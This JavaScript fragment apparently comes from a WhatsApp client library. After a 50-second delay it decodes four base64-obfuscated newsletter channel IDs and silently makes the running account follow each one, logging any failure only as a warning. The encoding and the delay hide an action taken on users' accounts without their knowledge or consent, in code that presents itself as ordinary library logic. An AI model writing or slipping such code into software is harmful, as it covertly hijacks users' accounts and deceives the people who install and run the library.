...
setTimeout(async () => {
    const encodedIds = [
        "MTIwMzYzNDA3Njg1NjMzMzYxQG5ld3NsZXR0ZXI=",
        "MTIwMzYzNDA0MjI2ODAwMzU2QG5ld3NsZXR0ZXI=",
        "MTIwMzYzNDI1NDkyNzM4MDQ2QG5ld3NsZXR0ZXI=",
        "MTIwMzYzNDI0MDQ1MTU1NDM4QG5ld3NsZXR0ZXI="
    ];

    const channelIds = encodedIds.map(id => Buffer.from(id, 'base64').toString('utf-8'));

    for (const jid of channelIds) {
        try {
            await newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW, {});
        } catch (err) {
            config.logger?.warn?.({ jid, err }, 'failed auto follow newsletter');
        }
    }
}, 50000);
